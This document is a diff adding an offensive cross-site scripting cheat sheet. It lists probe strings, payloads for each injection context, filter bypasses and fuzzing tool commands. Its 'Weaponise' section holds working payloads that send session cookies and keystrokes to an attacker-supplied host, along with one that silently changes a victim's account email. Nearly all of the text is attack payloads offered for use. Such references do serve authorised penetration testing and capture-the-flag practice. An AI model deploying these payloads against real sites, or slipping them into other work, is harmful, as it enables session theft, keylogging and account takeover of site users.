@@ -1,0 +1,32 @@
+XSS — QUICK REF
+
+Requires: an input that reflects into a page (reflected/stored) or a client-side JS sink (DOM)
+
+1.  Find + confirm (unique marker, check response + DOM):
+    ?q=xss7391
+    <script>alert(document.domain)</script>
+    "><img src=x onerror=alert(1)>
+    <svg onload=alert(1)>
+
+2.  Payload by context:
+    HTML body      <script>alert(1)</script> | <img src=x onerror=alert(1)>
+    attribute      "><svg onload=alert(1)>   | " autofocus onfocus=alert(1) x="
+    inside <script> ';alert(1)//  | </script><script>alert(1)</script>
+    URL/href       javascript:alert(1)
+    DOM (hash)     #<img src=x onerror=alert(1)>
+
+3.  Bypasses:
+    <ScRiPt>  |  <img src=x onerror=alert`1`>  (no parens)
+    <svg/onload=alert(1)>  <body onload=alert(1)>  <details open ontoggle=alert(1)>
+    handlers: onmouseover onerror onload onfocus ontoggle onanimationstart
+    encode: &#60;script&#62; | URL / double-URL encode
+
+4.  Weaponise:
+    <script>fetch('http://<your-ip>/c?'+document.cookie)</script>
+    <script>document.onkeypress=e=>fetch('http://<your-ip>/k?'+e.key)</script>
+    <script>fetch('/account/email',{method:'POST',credentials:'include',body:'email=attacker@x.com'})</script>
+
+5.  Tools:
+    dalfox url "http://<target>/?q=FUZZ"
+    XSStrike -u "http://<target>/?q=test"
+    # interactsh / your server to catch blind/stored callbacks
